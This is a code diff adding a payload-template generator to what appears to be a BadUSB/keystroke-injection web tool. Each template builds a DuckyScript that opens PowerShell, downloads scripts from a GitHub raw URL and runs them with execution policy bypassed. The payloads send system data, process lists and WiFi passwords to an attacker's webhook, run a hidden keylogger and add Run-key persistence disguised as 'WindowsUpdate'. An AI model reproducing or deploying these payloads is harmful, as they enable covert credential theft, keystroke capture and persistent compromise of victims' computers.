@@ -1242,6 +1242,337 @@ function scToEditor() {
 }
 
 // ═══════════════════════════════════════════════════
+//  PAYLOAD TEMPLATES
+// ═══════════════════════════════════════════════════
+
+var tpSelected = 'sysinfo';
+
+function tpSelectTemplate(id, btn) {
+  tpSelected = id;
+  document.querySelectorAll('#tpChoices .sc-choice').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  
+  const desc = $('tpDesc');
+  if (id === 'sysinfo') {
+    desc.textContent = 'Collects hardware, OS, and user information and sends it to a webhook.';
+  } else if (id === 'processes') {
+    desc.textContent = 'Collects running processes, services, and installed programs and sends them to your webhook.';
+  } else if (id === 'network') {
+    desc.textContent = 'Collects WiFi passwords, IP configuration, DNS, and ARP tables and sends them to your webhook.';
+  } else if (id === 'keylogger_full') {
+    desc.textContent = 'Runs a persistent background keylogger that captures and reports all keystrokes.';
+  } else if (id === 'persistence') {
+    desc.textContent = 'Ensures the keylogger is installed and adds it to the Windows Registry for boot persistence.';
+  } else if (id === 'suite') {
+    desc.textContent = 'The full arsenal: downloads and runs all collectors (SysInfo, Network, Processes), installs the keylogger, and sets up persistence.';
+  } else if (id === 'remove') {
+    desc.textContent = 'Stops all active keylogger jobs, removes registry persistence, and deletes all temporary script files.';
+  }
+}
+
+function tpGenerate() {
+  const webhook = $('tpWebhookUrl').value.trim();
+  if (!webhook) { toast('Enter a Webhook URL', 'warn'); return; }
+  
+  let script = '';
+  if (tpSelected === 'sysinfo') {
+    script = `REM System Info Collector - Hardware, OS, Users
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Download and run system info collector
+STRING curl -o "$env:TEMP\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sysinfo.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 3000
+
+STRING Write-Host "System Info Collected!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'processes') {
+    script = `REM Processes & Files Collector - Running processes, services, installed programs
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Download and run process collector
+STRING curl -o "$env:TEMP\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\process.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 3000
+
+STRING Write-Host "Process Info Collected!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'network') {
+    script = `REM Network & WiFi Info Collector - WiFi passwords, IP, DNS, ARP
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Download and run network collector
+STRING curl -o "$env:TEMP\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\network.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 3000
+
+STRING Write-Host "Network Info Collected!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'keylogger_full') {
+    script = `REM Keylogger Only - Runs forever, captures keystrokes
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Download keylogger
+STRING curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Run keylogger in background (hidden)
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\keylogger.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING Write-Host "Keylogger Running!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'persistence') {
+    script = `REM Add Persistence - Makes keylogger start on boot
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Ensure keylogger exists first
+STRING if (!(Test-Path "$env:TEMP\\keylogger.ps1")) { curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1" }
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Add to Registry
+STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\keylogger.ps1\`" -webhookUrl ${webhook}" /f
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING Write-Host "Persistence Added! Keylogger will start on boot." -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'suite') {
+    script = `REM Complete Suite - Runs all collectors + keylogger + persistence
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Create directory
+STRING mkdir $env:TEMP\\logger -Force
+DELAY 1000
+ENTER
+DELAY 500
+
+REM Download all scripts
+STRING curl -o "$env:TEMP\\logger\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\\logger\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\\logger\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\\logger\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+REM Run collectors
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\sysinfo.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\network.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\process.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Add persistence
+STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\logger\\keylogger.ps1\`" -webhookUrl ${webhook}" /f
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Start keylogger
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\keylogger.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING Write-Host "Complete Suite Deployed!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'remove') {
+    script = `REM Remove Everything - Stop keylogger and delete files
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Stop keylogger job
+STRING Get-Job | Stop-Job -Force; Get-Job | Remove-Job -Force
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Remove Registry persistence
+STRING reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Kill hidden PowerShell processes
+STRING Get-Process powershell | Where-Object { $_.StartTime -gt (Get-Date).AddHours(-1) } | Stop-Process -Force
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Delete script files
+STRING Remove-Item "$env:TEMP\\logger" -Recurse -Force -ErrorAction SilentlyContinue
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING Remove-Item "$env:TEMP\\*.ps1" -Force -ErrorAction SilentlyContinue
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING Write-Host "All components removed!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  }
+
+  $('tpOutput').value = script;
+  $('tpOutputCard').style.display = 'block';
+  toast('Template generated ✓');
+}
+
+function tpToEditor() {
+  const script = $('tpOutput').value.trim();
+  if (!script) return;
+  $('editor').value = script;
+  updateLines();
+  localStorage.setItem('gc_script', script);
+  closeTool('templates');
+  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
+  toast('Template sent to editor');
+}
+
+function tpClear() {
+  $('tpOutput').value = '';
+  $('tpOutputCard').style.display = 'none';
+}
+
+// ═══════════════════════════════════════════════════
 //  LIVE KEYBOARD
 // ═══════════════════════════════════════════════════
 
